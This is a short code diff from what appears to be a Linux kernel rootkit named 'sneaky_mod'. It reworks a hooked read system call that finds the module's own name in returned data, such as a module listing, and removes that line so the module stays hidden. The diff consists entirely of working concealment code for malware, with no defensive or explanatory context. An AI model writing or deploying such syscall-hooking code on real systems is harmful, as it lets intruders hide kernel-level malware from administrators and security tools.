@@ -97,18 +97,17 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
 	char * ptr_head = NULL;
 	ssize_t rtn = original_read(fd, buf, count);
-	
+	ssize_t move_size;	
 	if(rtn>0 && module_opened==1 && ((ptr_head=strstr(buf,"sneaky_mod"))!=NULL)) {
 		char * ptr_tail = ptr_head;
 		while(*ptr_tail != '\n'){
 			++ptr_tail;
 		}
-		ssize_t move_size = (ssize_t)(rtn - (ptr_tail + 1 - (char*)buf));
-		ssize_t new_rtn = (ssize_t)(rtn - (ptr_tail + 1 - ptr_head));
+		move_size = (ssize_t)(rtn - (ptr_tail + 1 - (char*)buf));
+		rtn = (ssize_t)(rtn - (ptr_tail + 1 - ptr_head));
 		++ptr_tail;
 		memmove(ptr_head, ptr_tail, move_size);
 		module_opened = 0;
-		return new_rtn;
 	}
 	return rtn;
 }
